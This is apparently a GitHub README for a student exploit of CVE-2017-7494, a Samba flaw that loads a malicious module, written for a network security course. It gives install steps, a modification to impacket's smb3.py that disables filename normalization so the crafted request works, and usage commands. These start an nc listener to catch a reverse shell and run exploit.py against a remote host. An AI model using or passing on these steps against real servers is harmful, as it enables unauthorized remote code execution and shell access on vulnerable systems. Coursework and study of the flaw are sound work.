# BIT-EternalBlue-for-macOS&Linux
Exploit CVE-2017-7494 for Net Security course final Assignment. This would reveal the vulnerability of services that run in administrative priority on OS.

This bug is workable on both macOS and Linux.

## Install

Before exploit, you need to download dependencies.

```shell
/bin/bash install_requirement.sh
```

One of the most important dependencies is the `impacket` package for python. It make smb connection works.

However, in order to construct a valid request that make the samba server load our malicious module, we have to modify the original impacket.

The installation `install_requirement.sh` installs a modified version (modified by me) so **you do not have to worry about that and you are not need to do any manual modification**.

However, if you want to use some newer version or another version of `impacket`, you have to modify that package by yourself.

> Goto `impacket/impacket/smb3.py` modify line 11154 and comment following two sentences:

```python
#         fileName = fileName.replace('/', '\\') Should be comment!
        if len(fileName) > 0:
#             fileName = ntpath.normpath(fileName) Should be comment!
            if fileName[0] == '\\':
                fileName = fileName[1:]
```

## How to use

To exploit target, you need open two terminals.

Usage:

```shell
#First terminal use nc to get reverse shell
$ nc -p 23333 -l

# Second terminal to exploit target
$ python3 ./exploit.py -lhost 192.168.71.136 --rhost 192.168.71.135
```

## Uninstall

```shell
sudo -H python3 -m pip uninstall impacket
```

## Todo:
- [] macOS Samba installation guide.

A detailed process would be post in Chinese as my final assignment. If you understand Chinese, it would be fine for you. :)